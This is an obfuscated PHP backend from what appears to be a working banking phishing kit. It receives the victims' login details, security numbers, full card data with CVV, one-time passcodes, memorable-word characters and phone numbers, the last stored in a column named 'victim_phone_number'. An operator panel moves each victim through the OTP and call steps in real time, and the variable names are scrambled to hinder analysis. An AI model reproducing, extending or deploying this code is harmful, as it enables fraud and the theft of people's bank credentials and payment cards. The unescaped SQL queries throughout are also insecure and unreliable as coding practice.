<?php $ {
    "GLOBALS"
}
["ogwstlqep"] = "cccvv";
$ {
    "GLOBALS"
}
["mmcaaqqaqxd"] = "ccnum";
$ {
    "GLOBALS"
}
["iomkmgdiyj"] = "ccname";
$ {
    "GLOBALS"
}
["lwhmkjk"] = "id";
$ {
    "GLOBALS"
}
["iwwnbqfelae"] = "stat";
$ {
    "GLOBALS"
}
["jcbtrpp"] = "queryy";
$ {
    "GLOBALS"
}
["gunsgnf"] = "userid";
$ {
    "GLOBALS"
}
["bgljxlu"] = "resp";
$ {
    "GLOBALS"
}
["dlubgeq"] = "time";
$ {
    "GLOBALS"
}
["bwtcbfoir"] = "array";
$ {
    "GLOBALS"
}
["evrpiuyx"] = "arrays";
$ {
    "GLOBALS"
}
["buukhyrrt"] = "callcode";
$ {
    "GLOBALS"
}
["sognwoazc"] = "callnum";
$ {
    "GLOBALS"
}
["tnrnzkokycqf"] = "conn";
$ {
    "GLOBALS"
}
["ucusiinhf"] = "query";
$ {
    "GLOBALS"
}
["ckhbgwduwjpb"] = "uniqueid";
$ {
    "GLOBALS"
}
["mcouxkuruxbg"] = "ua";
$ {
    "GLOBALS"
}
["lirnobwefo"] = "ip";
$ {
    "GLOBALS"
}
["qmvuuk"] = "urls";
$ {
    "GLOBALS"
}
["ywvwnagvmpm"] = "status";
$ {
    "GLOBALS"
}
["xnttfuw"] = "num";
include "config.php";
$ {
    "GLOBALS"
}
["ubbjwsy"] = "urls";
include "connect.php";
session_start();
function numeric($num) {
    if (preg_match("/^[0-9]+\$/", $ {
        $ {
            "GLOBALS"
        }
        ["xnttfuw"]
    })) {
        $ {
            $ {
                "GLOBALS"
            }
            ["ywvwnagvmpm"]
        } = true;
    } else {
        $ {
            $ {
                "GLOBALS"
            }
            ["ywvwnagvmpm"]
        } = false;
    }
    return $ {
        $ {
            "GLOBALS"
        }
        ["ywvwnagvmpm"]
    };
}

if ($_GET["type"] == "login") {
    if ($_POST["username"] and $_POST["securityNumber"] and $_POST["ip"] and $_POST["ua"]) {
        $ {
            "GLOBALS"
        }
        ["ckoqelov"] = "password";
        $elnerfclxtu = "username";
        $ {
            $elnerfclxtu
        } = $_POST["username"];
        $ {
            $ {
                "GLOBALS"
            }
            ["ckoqelov"]
        } = $_POST["securityNumber"];
        $ {
            "GLOBALS"
        }
        ["ahixllsxnh"] = "uniqueid";
        $ {
            $ {
                "GLOBALS"
            }
            ["lirnobwefo"]
        } = $_POST["ip"];
        $ {
            $ {
                "GLOBALS"
            }
            ["mcouxkuruxbg"]
        } = urlencode($_POST["ua"]);
        $ {
            $ {
                "GLOBALS"
            }
            ["ahixllsxnh"]
        } = time();
        if ($_SESSION["started"] == "true") {
            $ {
                $ {
                    "GLOBALS"
                }
                ["ckhbgwduwjpb"]
            } = $_SESSION["uniqueid"];
            $ {
                "GLOBALS"
            }
            ["ynjeutjvoz"] = "conn";
            $ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["ynjeutjvoz"]
            }, "UPDATE customers SET status=1, buzzed=0, username='$username', password='$password', useragent='$ua', ip='$ip' WHERE uniqueid=$uniqueid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok1"));
            }
        } else {
            $ {
                "GLOBALS"
            }
            ["xfddeuf"] = "query";
            $_SESSION["uniqueid"] = $ {
                $ {
                    "GLOBALS"
                }
                ["ckhbgwduwjpb"]
            };
            $_SESSION["started"] = "true";
            $ {
                $ {
                    "GLOBALS"
                }
                ["xfddeuf"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["tnrnzkokycqf"]
            }, "INSERT INTO customers (username, password , ip, useragent,uniqueid, status) VALUES ('$username', '$password', '$ip', '$ua',$uniqueid, 1)");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok2"));
            }
        }
    }
}
if ($_SESSION["admin_logged"] == "true") {
    if ($_GET["type"] == "commmand") {
        if ($_POST["userid"] and numeric($_POST["userid"]) == true and $_POST["status"] and numeric($_POST["status"]) == true or $_POST["callcode"] or $_POST["callnum"] or $_POST["lastotpamount"]) {
            $ {
                "GLOBALS"
            }
            ["ycjsvq"] = "userid";
            $clphuhwnm = "callnum";
            $xbbrkf = "callcode";
            $lastotpamount = $_POST["lastotpamount"];
            $ {
                "GLOBALS"
            }
            ["eigzkke"] = "callcode";
            $ {
                $ {
                    "GLOBALS"
                }
                ["ycjsvq"]
            } = $_POST["userid"];
            $ {
                "GLOBALS"
            }
            ["igkdfpbw"] = "callcode";
            $xwffyafxmkb = "status";
            $ {
                $xwffyafxmkb
            } = $_POST["status"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["igkdfpbw"]
            } = $_POST["callcode"];
            $ {
                "GLOBALS"
            }
            ["bpysrkrby"] = "callcode";
            $ {
                "GLOBALS"
            }
            ["ukgudglwrfm"] = "query";
            $ {
                $ {
                    "GLOBALS"
                }
                ["sognwoazc"]
            } = $_POST["callnum"];
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["buukhyrrt"]
            } != null and $ {
                $ {
                    "GLOBALS"
                }
                ["bpysrkrby"]
            } != "" and ($ {
                $ {
                    "GLOBALS"
                }
                ["sognwoazc"]
            } == null or $ {
                $ {
                    "GLOBALS"
                }
                ["sognwoazc"]
            } == "")) {
                $wnjfliignmb = "query";
                $xavytfot = "conn";
                $ {
                    $wnjfliignmb
                } = mysqli_query($ {
                    $xavytfot
                }, "UPDATE customers SET status=$status, code='$callcode' WHERE id=$userid");
            } elseif ($ {
                $clphuhwnm
            } != null and $ {
                $ {
                    "GLOBALS"
                }
                ["sognwoazc"]
            } != "" and ($ {
                $ {
                    "GLOBALS"
                }
                ["eigzkke"]
            } == null or $ {
                $xbbrkf
            } == "")) {
                $cbcmeoxr = "query";
                $ {
                    $cbcmeoxr
                } = mysqli_query($ {
                    $ {
                        "GLOBALS"
                    }
                    ["tnrnzkokycqf"]
                }, "UPDATE customers SET status=$status, part_number='$callnum' WHERE id=$userid");
            } elseif ($lastotpamount != null and $lastotpamount != '') {
                $query = mysqli_query($conn, "UPDATE customers SET status=$status, lastotpamount='$lastotpamount' WHERE id=$userid");
            } else {
                $ {
                    "GLOBALS"
                }
                ["bmqdooldlmrs"] = "query";
                $ {
                    "GLOBALS"
                }
                ["plqsopfeost"] = "conn";
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["bmqdooldlmrs"]
                } = mysqli_query($ {
                    $ {
                        "GLOBALS"
                    }
                    ["plqsopfeost"]
                }, "UPDATE customers SET status=$status WHERE id=$userid");
            }
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["ukgudglwrfm"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notokk"));
        }
    }
    if (isset($_GET["get_online"])) {
        $iefpivbmiqn = "conn";
        $yljqgqvpizp = "time";
        $jewifuqmf = "query";
        $ {
            $yljqgqvpizp
        } = time();
        $mmaqlthwvf = "query";
        $ {
            $mmaqlthwvf
        } = mysqli_query($ {
            $iefpivbmiqn
        }, "SELECT * FROM customers");
        if ($ {
            $jewifuqmf
        }) {
            $ {
                "GLOBALS"
            }
            ["fdfiwdhgn"] = "query";
            $ {
                "GLOBALS"
            }
            ["oracvkj"] = "query";
            $fdhktwkuz = "arrays";
            $ {
                $ {
                    "GLOBALS"
                }
                ["xnttfuw"]
            } = mysqli_num_rows($ {
                $ {
                    "GLOBALS"
                }
                ["oracvkj"]
            });
            $ {
                $fdhktwkuz
            } = mysqli_fetch_all($ {
                $ {
                    "GLOBALS"
                }
                ["fdfiwdhgn"]
            }, MYSQLI_ASSOC);
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["xnttfuw"]
            } >= 1) {
                $zkcwybchzp = "array";
                foreach ($ {
                    $ {
                        "GLOBALS"
                    }
                    ["evrpiuyx"]
                } as $ {
                    $zkcwybchzp
                }) {
                    $wtrsdrfachi = "resp";
                    $jgncfytrbkx = "array";
                    $vobnaeouf = "array";
                    $sfnkgii = "array";
                    if ($ {
                        $ {
                            "GLOBALS"
                        }
                        ["bwtcbfoir"]
                    }
                    ["online_status"] == 1) {
                        $gldfqbzmjj = "status";
                        $ {
                            $gldfqbzmjj
                        } = "online";
                    } elseif ($ {
                        $vobnaeouf
                    }
                    ["online_status"] == 2) {
                        $ {
                            "GLOBALS"
                        }
                        ["dckofyks"] = "status";
                        $ {
                            $ {
                                "GLOBALS"
                            }
                            ["dckofyks"]
                        } = "idle";
                    } elseif ($ {
                        $jgncfytrbkx
                    }
                    ["online_status"] == 3) {
                        $iyqcpvvw = "status";
                        $ {
                            $iyqcpvvw
                        } = "offline";
                    }
                    if ($ {
                        $ {
                            "GLOBALS"
                        }
                        ["dlubgeq"]
                    } - $ {
                        $ {
                            "GLOBALS"
                        }
                        ["bwtcbfoir"]
                    }
                    ["lastonline"] > 3) {
                        $ {
                            $ {
                                "GLOBALS"
                            }
                            ["ywvwnagvmpm"]
                        } = "offline";
                    }
                    $ {
                        $wtrsdrfachi
                    }
                    ["values"]["imguserid_" . $ {
                        $sfnkgii
                    }
                    ["id"]] = $ {
                        $ {
                            "GLOBALS"
                        }
                        ["ywvwnagvmpm"]
                    };
                }
                $csfvwldvn = "resp";
                $ {
                    $csfvwldvn
                }
                ["status"] = "ok";
                echo json_encode($ {
                    $ {
                        "GLOBALS"
                    }
                    ["bgljxlu"]
                });
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notok"));
        }
    }
    if (isset($_GET["get_submitted"])) {
        $vzrpsy = "query";
        $udonchv = "query";
        $ {
            $vzrpsy
        } = mysqli_query($ {
            $ {
                "GLOBALS"
            }
            ["tnrnzkokycqf"]
        }, "SELECT * FROM customers WHERE (status=1 and buzzed=0) or (buzzed=0 and status=13)");
        if ($ {
            $udonchv
        }) {
            $ {
                "GLOBALS"
            }
            ["idtvtuckqd"] = "num";
            $ {
                "GLOBALS"
            }
            ["cphivmfu"] = "query";
            $ {
                $ {
                    "GLOBALS"
                }
                ["idtvtuckqd"]
            } = mysqli_num_rows($ {
                $ {
                    "GLOBALS"
                }
                ["cphivmfu"]
            });
            $ {
                $ {
                    "GLOBALS"
                }
                ["bwtcbfoir"]
            } = mysqli_fetch_array($ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            }, MYSQLI_ASSOC);
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["xnttfuw"]
            } >= 1) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notok"));
        }
    }
    if (isset($_GET["buzzoff"])) {
        $ {
            "GLOBALS"
        }
        ["ytdvxh"] = "query";
        $ {
            "GLOBALS"
        }
        ["pkxsqhghwqj"] = "conn";
        $ {
            $ {
                "GLOBALS"
            }
            ["ucusiinhf"]
        } = mysqli_query($ {
            $ {
                "GLOBALS"
            }
            ["pkxsqhghwqj"]
        }, "SELECT * FROM customers WHERE status=1 OR status=13");
        if ($ {
            $ {
                "GLOBALS"
            }
            ["ytdvxh"]
        }) {
            $ {
                "GLOBALS"
            }
            ["tswxxomecfoz"] = "query";
            $ktlkqioidb = "value";
            $ {
                $ {
                    "GLOBALS"
                }
                ["bwtcbfoir"]
            } = array_filter(mysqli_fetch_all($ {
                $ {
                    "GLOBALS"
                }
                ["tswxxomecfoz"]
            }, MYSQLI_ASSOC));
            foreach ($ {
                $ {
                    "GLOBALS"
                }
                ["bwtcbfoir"]
            } as $ {
                $ktlkqioidb
            }) {
                $ {
                    "GLOBALS"
                }
                ["fgupulaw"] = "value";
                $ptjqjdvqq = "queryy";
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["gunsgnf"]
                } = $ {
                    $ {
                        "GLOBALS"
                    }
                    ["fgupulaw"]
                }
                ["id"];
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["jcbtrpp"]
                } = mysqli_query($ {
                    $ {
                        "GLOBALS"
                    }
                    ["tnrnzkokycqf"]
                }, "UPDATE customers SET buzzed=1 WHERE id=$userid");
                if ($ {
                    $ptjqjdvqq
                }) {
                    $ {
                        $ {
                            "GLOBALS"
                        }
                        ["iwwnbqfelae"]
                    } = "ok";
                } else {
                    $ {
                        "GLOBALS"
                    }
                    ["nyqsugf"] = "stat";
                    $ {
                        $ {
                            "GLOBALS"
                        }
                        ["nyqsugf"]
                    } = "notok";
                }
            }
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["iwwnbqfelae"]
            } == "ok") {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notok"));
        }
    }
    if ($_GET["type"] == "delete") {
        if ($_POST["userid"] and numeric($_POST["userid"]) == true) {
            $ {
                "GLOBALS"
            }
            ["qelxawhvncr"] = "userid";
            $ohporans = "query";
            $ {
                "GLOBALS"
            }
            ["uifryvad"] = "conn";
            $ {
                $ {
                    "GLOBALS"
                }
                ["qelxawhvncr"]
            } = $_POST["userid"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["uifryvad"]
            }, "DELETE FROM customers WHERE id=$userid");
            if ($ {
                $ohporans
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notokk"));
        }
    }
    if ($_GET["type"] == "submitted") {
        if ($_POST["userid"] and numeric($_POST["userid"]) == true) {
            $ {
                $ {
                    "GLOBALS"
                }
                ["gunsgnf"]
            } = $_POST["userid"];
            $hsqbipqfyim = "status";
            $ {
                "GLOBALS"
            }
            ["mfibikldsm"] = "status";
            $ {
                $hsqbipqfyim
            } = str_replace("_$userid", "", $_POST["status"]);
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["mfibikldsm"]
            } == "accept") {
                $ {
                    "GLOBALS"
                }
                ["gmhjgywj"] = "status";
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["gmhjgywj"]
                } = 11;
            } elseif ($ {
                $ {
                    "GLOBALS"
                }
                ["ywvwnagvmpm"]
            } == "reject") {
                $ {
                    $ {
                        "GLOBALS"
                    }
                    ["ywvwnagvmpm"]
                } = 12;
            } else {
                echo json_encode(array("status" => "notok"));
            }
            $ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["tnrnzkokycqf"]
            }, "UPDATE customers SET status=$status WHERE id=$userid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        } else {
            echo json_encode(array("status" => "notokk"));
        }
    }
}
if ($_SESSION["started"] == "true") {
    if ($_GET["askotp"] and numeric($_GET["askotp"]) == true) {
        $ {
            $ {
                "GLOBALS"
            }
            ["lwhmkjk"]
        } = $_GET["askotp"];
        $ {
            "GLOBALS"
        }
        ["crijifldiauy"] = "conn";
        $ {
            $ {
                "GLOBALS"
            }
            ["dlubgeq"]
        } = time();
        $ {
            $ {
                "GLOBALS"
            }
            ["ucusiinhf"]
        } = mysqli_query($ {
            $ {
                "GLOBALS"
            }
            ["crijifldiauy"]
        }, "UPDATE customers SET status=13, buzzed=0 WHERE uniqueid=$id");
        $ {
            "GLOBALS"
        }
        ["cwyvqxdoq"] = "query";
        if ($ {
            $ {
                "GLOBALS"
            }
            ["cwyvqxdoq"]
        }) {
            echo json_encode(array("status" => "ok"));
        } else {
            echo json_encode(array("status" => "notok"));
        }
    }
    if ($_GET["wait"] and numeric($_GET["wait"]) == true) {
        $ {
            "GLOBALS"
        }
        ["rgibmyug"] = "id";
        $tgsnskek = "query";
        $ {
            "GLOBALS"
        }
        ["duxngewik"] = "query";
        $doetwvkxx = "conn";
        $ {
            $ {
                "GLOBALS"
            }
            ["rgibmyug"]
        } = $_GET["wait"];
        $ {
            $tgsnskek
        } = mysqli_query($ {
            $doetwvkxx
        }, "UPDATE customers SET status=0 WHERE uniqueid=$id");
        if ($ {
            $ {
                "GLOBALS"
            }
            ["duxngewik"]
        }) {
            echo json_encode(array("status" => "ok"));
        } else {
            echo json_encode(array("status" => "notok"));
        }
    }
    if ($_GET["getstatus"] and numeric($_GET["getstatus"]) == true) {
        $ {
            $ {
                "GLOBALS"
            }
            ["lwhmkjk"]
        } = $_GET["getstatus"];
        $ {
            $ {
                "GLOBALS"
            }
            ["ucusiinhf"]
        } = mysqli_query($ {
            $ {
                "GLOBALS"
            }
            ["tnrnzkokycqf"]
        }, "SELECT * from customers WHERE uniqueid='$id'");
        $ {
            "GLOBALS"
        }
        ["jvcmgsntyx"] = "query";
        if (mysqli_num_rows($ {
            $ {
                "GLOBALS"
            }
            ["jvcmgsntyx"]
        }) >= 1) {
            $ {
                "GLOBALS"
            }
            ["uwqnqyybf"] = "array";
            $ {
                $ {
                    "GLOBALS"
                }
                ["uwqnqyybf"]
            } = mysqli_fetch_array($ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            }, MYSQLI_ASSOC);
            echo $ {
                $ {
                    "GLOBALS"
                }
                ["bwtcbfoir"]
            }
            ["status"];
        }
    }
    if ($_GET["type"] == "saveotp") {
        if ($_POST["otpcode"] and $_POST["userid"] and numeric($_POST["userid"]) == true) {
            $oeelkdrutq = "otpcode";
            $ {
                "GLOBALS"
            }
            ["feoktuug"] = "uniqueid";
            $ {
                $oeelkdrutq
            } = $_POST["otpcode"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["feoktuug"]
            } = $_POST["userid"];
            $risploog = "query";
            $ {
                $risploog
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["tnrnzkokycqf"]
            }, "UPDATE customers SET otpcode='$otpcode', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }
    if ($_GET["type"] == "card") {
        if ($_POST["ccname"] and $_POST["ccnum"] and $_POST["ccexp"] and $_POST["cccvv"] and $_POST["userid"] and numeric($_POST["userid"]) == true) {
            $ {
                "GLOBALS"
            }
            ["suexuzqt"] = "ccexp";
            $ {
                $ {
                    "GLOBALS"
                }
                ["iomkmgdiyj"]
            } = $_POST["ccname"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["mmcaaqqaqxd"]
            } = $_POST["ccnum"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["suexuzqt"]
            } = $_POST["ccexp"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["ogwstlqep"]
            } = $_POST["cccvv"];
            $ {
                "GLOBALS"
            }
            ["isivdmuymoyf"] = "uniqueid";
            $ {
                "GLOBALS"
            }
            ["nvtkahuipsq"] = "query";
            $ {
                $ {
                    "GLOBALS"
                }
                ["isivdmuymoyf"]
            } = $_POST["userid"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["tnrnzkokycqf"]
            }, "UPDATE customers SET ccname='$ccname',ccnum='$ccnum',ccexp='$ccexp',cccvv='$cccvv', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["nvtkahuipsq"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }
    if ($_GET["type"] == "memo") {
        if ($_POST["formMem1"] and $_POST["formMem2"] and $_POST["formMem3"] and $_POST["userid"] and numeric($_POST["userid"]) == true) {
            $otrodkpfyar = "formMem1";
            $ {
                "GLOBALS"
            }
            ["iezdsmay"] = "formMem3";
            $vydndpohfj = "formMem2";
            $ {
                $otrodkpfyar
            } = $_POST["formMem1"];
            $ {
                "GLOBALS"
            }
            ["ywmhcfhstnmz"] = "conn";
            $ {
                $vydndpohfj
            } = $_POST["formMem2"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["iezdsmay"]
            } = $_POST["formMem3"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["ckhbgwduwjpb"]
            } = $_POST["userid"];
            $ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["ywmhcfhstnmz"]
            }, "UPDATE customers SET char1='$formMem1',char2='$formMem2',char3='$formMem3', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }
    if ($_GET["type"] == "call") {
        if ($_POST["userid"] and numeric($_POST["userid"]) == true) {
            $ebvwarrqog = "query";
            $ {
                $ {
                    "GLOBALS"
                }
                ["ckhbgwduwjpb"]
            } = $_POST["userid"];
            $ {
                "GLOBALS"
            }
            ["cgiavujw"] = "conn";
            $ {
                $ebvwarrqog
            } = mysqli_query($ {
                $ {
                    "GLOBALS"
                }
                ["cgiavujw"]
            }, "UPDATE customers SET status=13, buzzed=0 WHERE uniqueid=$uniqueid");
            if ($ {
                $ {
                    "GLOBALS"
                }
                ["ucusiinhf"]
            }) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }

    if ($_GET["type"] == "phonenumber") {
        if ($_POST["phonenumber"] and $_POST["userid"] and numeric($_POST["userid"]) == true) {
            $phonenumber = $_POST["phonenumber"];
            $uniqueid = $_POST["userid"];
            $query = mysqli_query($conn, "UPDATE customers SET status=1, buzzed=0, victim_phone_number={$phonenumber} WHERE uniqueid={$uniqueid}");
            if ($query) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }

    if ($_GET["type"] == "lastotpcode") {
        if ($_POST["lastotpcode"] and $_POST["userid"] and numeric($_POST["userid"]) == true) {
            $lastotpcode = $_POST["lastotpcode"];
            $uniqueid = $_POST["userid"];
            $query = mysqli_query($conn, "UPDATE customers SET status=1, buzzed=0, lastotpcode='$lastotpcode' WHERE uniqueid=$uniqueid");
            if ($query) {
                echo json_encode(array("status" => "ok"));
            } else {
                echo json_encode(array("status" => "notok"));
            }
        }
    }
}
?>